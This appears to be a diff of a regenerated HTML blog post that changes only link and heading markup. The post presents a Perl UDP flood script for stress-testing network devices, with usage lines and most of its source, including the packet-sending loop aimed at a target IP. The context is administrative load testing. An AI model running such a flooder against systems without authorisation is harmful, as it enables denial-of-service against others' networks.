@@ -87,22 +87,13 @@ ga('send', 'pageview');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>There are some situations when network and system administrator(s) may need to <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/UDP_flood_attack" >UDP flood</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> network devices with the purpose of testing them under stress. The preferred method I use is by means of a Perl script created by <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.ioshints.info/About_Ivan_Pepelnjak" >Ivan Pepelnjak</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> from <a href="ioshints.info">ioshints.info</a>. The script is highly configurable allowing the user to dictate the amount of bandwidth to be used during the flood, and the port to name a few. <strong>Note:</strong> <em>Windows users will need to install either</em> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.activestate.com/activeperl/" >ActivePerl</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> <em>or</em> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://strawberryperl.com/" >Strawberry Perl</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>
-
-        <h4 id="Use"   >
-          <a href="#Use" class="heading-link"><i class="fas fa-link"></i></a>Use</h4>
-      <p>flood.pl –port port –size bytes –time seconds –bandwidth kbps –delay msec target-ip-address</p>
+        <p>There are some situations when network and system administrator(s) may need to <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/UDP_flood_attack">UDP flood</a> network devices with the purpose of testing them under stress. The preferred method I use is by means of a Perl script created by <a target="_blank" rel="noopener" href="http://www.ioshints.info/About_Ivan_Pepelnjak">Ivan Pepelnjak</a> from <a href="ioshints.info">ioshints.info</a>. The script is highly configurable allowing the user to dictate the amount of bandwidth to be used during the flood, and the port to name a few. <strong>Note:</strong> <em>Windows users will need to install either</em> <a target="_blank" rel="noopener" href="http://www.activestate.com/activeperl/">ActivePerl</a> <em>or</em> <a target="_blank" rel="noopener" href="http://strawberryperl.com/">Strawberry Perl</a>.</p>
+<h4 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h4><p>flood.pl –port port –size bytes –time seconds –bandwidth kbps –delay msec target-ip-address</p>
 <p>In its simplest form you can ignore the extra parameters and issue:</p>
 <p>script_name.pl 192.168.1.10</p>
-<p>For an explanation of the parameters visit <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wiki.nil.com/UDP_flood_in_Perl" >wiki.nil.com/UDP_flood_in_Perl</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>
-
-        <h4 id="Script-Source-Code"   >
-          <a href="#Script-Source-Code" class="heading-link"><i class="fas fa-link"></i></a>Script Source Code</h4>
-      <p>#!/usr/bin/perl<br>#####################################################</p>
-
-        <h1 id="udp-flood"   >
-          <a href="#udp-flood" class="heading-link"><i class="fas fa-link"></i></a>udp flood.</h1>
-      <p>######################################################</p>
+<p>For an explanation of the parameters visit <a target="_blank" rel="noopener" href="http://wiki.nil.com/UDP_flood_in_Perl">wiki.nil.com/UDP_flood_in_Perl</a>.</p>
+<h4 id="Script-Source-Code"><a href="#Script-Source-Code" class="headerlink" title="Script Source Code"></a>Script Source Code</h4><p>#!/usr/bin/perl<br>#####################################################</p>
+<h1 id="udp-flood"><a href="#udp-flood" class="headerlink" title="udp flood."></a>udp flood.</h1><p>######################################################</p>
 <p>use Socket;<br>use strict;<br>use Getopt::Long;<br>use Time::HiRes qw( usleep gettimeofday ) ;</p>
 <p>our $port = 0;<br>our $size = 0;<br>our $time = 0;<br>our $bw   = 0;<br>our $help = 0;<br>our $delay= 0;</p>
 <p>GetOptions(<br>    “port=i” =&gt; $port,        # UDP port to use, numeric, 0=random<br>    “size=i” =&gt; $size,        # packet size, number, 0=random<br>    “bandwidth=i” =&gt; $bw,        # bandwidth to consume<br>    “time=i” =&gt; $time,        # time to run<br>    “delay=f”=&gt; $delay,        # inter-packet delay<br>    “help|?” =&gt; $help);        # help</p>
@@ -121,13 +112,13 @@ ga('send', 'pageview');
 <p>die “Invalid packet size requested: $sizen” if $size &amp;&amp; ($size &lt; 64 || $size &gt; 1500);<br>$size -= 28 if $size;<br>for (;time() &lt;= $endtime;) {<br>  $psize = $size ? $size : int(rand(1024-64)+64) ;<br>  $pport = $port ? $port : int(rand(65500))+1;</p>
 <p>  send(flood, pack(“a$psize”,”flood”), 0, pack_sockaddr_in($pport, $iaddr));<br>  usleep(1000 * $delay) if $delay;<br>}</p>
 <ul>
-<li>Orginal script can be found at <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wiki.nil.com/UDP_flood_in_Perl" >wiki.nil.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</li>
+<li>Orginal script can be found at <a target="_blank" rel="noopener" href="http://wiki.nil.com/UDP_flood_in_Perl">wiki.nil.com</a>.</li>
 </ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://linhost.info/2010/05/udp-flood-script/" data-id="ckitzbgka00qo7nfx96d93ied" class="article-share-link">Share</a>
+      <a data-url="http://linhost.info/2010/05/udp-flood-script/" data-id="ckitzu6sn00vkepfxd9qx7zzv" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/script/" rel="tag">script</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/udp/" rel="tag">udp</a></li></ul>
